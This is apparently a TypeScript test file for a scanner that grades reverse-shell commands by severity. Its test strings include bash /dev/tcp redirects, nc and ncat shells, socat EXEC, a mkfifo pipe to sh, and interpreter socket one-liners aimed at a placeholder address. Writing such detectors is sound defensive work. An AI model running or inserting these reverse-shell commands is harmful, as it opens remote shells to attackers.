import { expect, test } from "bun:test";
import { reverseShell } from "./reverse-shell.ts";
import { shellStatements } from "./shell.ts";

const noProseContext = { afterProhibition: () => false, demoted: () => false };

const inScript = (...lines: string[]) => {
  const text = lines.join("\n");
  return reverseShell(text, shellStatements(text, false), noProseContext);
};

const severity = (line: string) => inScript(line)?.severity;

test("a shell wired to a socket is critical", () => {
  expect(inScript("bash -i >& /dev/tcp/192.0.2.1/1234 0>&1")).toEqual({
    severity: "critical",
    line: 1,
    detail: "bash -i >& /dev/tcp/192.0.2.1/1234",
  });
  expect(severity("exec 5<>/dev/udp/192.0.2.1/1234")).toBe("critical");
  expect(severity("nc -e /bin/sh 192.0.2.1 1234")).toBe("critical");
  expect(severity("ncat 192.0.2.1 1234 -c /bin/bash")).toBe("critical");
  expect(severity("mkfifo /tmp/f; cat /tmp/f | /bin/sh -i")).toBe("critical");
  expect(severity("socat TCP:192.0.2.1:1234 EXEC:true")).toBe("critical");
});

test("interpreter one-liners that open a socket or spawn a pty shell", () => {
  expect(
    severity(`python3 -c "import socket; s=socket.socket(); s.connect(('192.0.2.1',1234))"`),
  ).toBe("critical");
  expect(severity('pty.spawn("/bin/sh")')).toBe("critical");
  expect(severity(`php -r '$s=fsockopen("192.0.2.1",1234);'`)).toBe("critical");
  expect(severity(`ruby -rsocket -e 'TCPSocket.new("192.0.2.1",1234)'`)).toBe("critical");
  expect(severity("powershell -enc AAAAAAAAAAAAAAAAAAAAAAAA")).toBe("critical");
});

test("network tools without a shell are not a match", () => {
  expect(severity("nc -zv db.internal 5432")).toBeUndefined();
  expect(severity("socat TCP-LISTEN:8080,fork TCP:192.0.2.1:80")).toBeUndefined();
  expect(severity('python3 -c "import socket; print(socket.gethostname())"')).toBeUndefined();
  expect(severity("powershell -e short")).toBeUndefined();
});

test("a comment drops one level", () => {
  expect(severity("# bash -i >& /dev/tcp/192.0.2.1/1234 0>&1")).toBe("warn");
});
